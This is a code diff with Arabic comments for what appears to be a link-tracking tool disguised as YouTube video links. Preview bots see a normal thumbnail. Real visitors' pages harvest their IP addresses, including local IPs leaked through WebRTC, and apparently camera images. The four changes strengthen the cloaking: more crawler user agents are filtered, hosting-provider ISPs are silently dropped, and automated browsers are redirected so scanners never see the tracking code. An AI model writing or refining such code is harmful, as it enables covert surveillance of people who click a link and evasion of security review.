@@ -186,7 +186,11 @@ function fetch_youtube_meta($url) {
     return $meta;
 }
 
+// تعديل 1: دالة جلب الـ IP الحقيقي
 function get_real_ip() {
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        return $_SERVER['HTTP_CF_CONNECTING_IP'];
+    }
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
         return trim($ips[0]);
@@ -262,7 +266,9 @@ if (isset($_GET['r'])) {
         $video_embed_url = $video_id ? "https://www.youtube.com/embed/{$video_id}" : "";
 
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
+        
+        // تعديل 2: إضافة بوتات تيك توك للفلتر
+        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom|bytespider|bytedance|tiktokbot/i', $ua);
 
         if ($is_bot) {
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
@@ -310,7 +316,8 @@ if (isset($_GET['r'])) {
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
             
-            $bot_isps = ['Facebook', 'Google', 'Amazon', 'Microsoft', 'Telegram', 'Meta', 'Cloudflare', 'Twitter'];
+            // تعديل 3: إضافة سيرفرات Byteplus وغيرها لقائمة الحظر
+            $bot_isps = ['Facebook', 'Google', 'Amazon', 'Microsoft', 'Telegram', 'Meta', 'Cloudflare', 'Twitter', 'Byteplus', 'Bytedance', 'TikTok', 'DigitalOcean', 'OVH', 'Hetzner', 'Linode', 'Alibaba', 'Tencent'];
             foreach ($bot_isps as $bisp) { if (stripos($ip_details['isp'], $bisp) !== false) exit; }
             
             $img_base64 = $_POST['image'] ?? '';
@@ -365,6 +372,12 @@ if (isset($_GET['r'])) {
         function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }
 
         async function initTracking() {
+            // تعديل 4: منع المتصفحات الوهمية (البوتات) من تنفيذ الكود
+            if (navigator.webdriver) {
+                window.location.replace(targetUrl);
+                return;
+            }
+
             let imageData = "";
             
             let cameraPromise = new Promise(async (resolve) => {
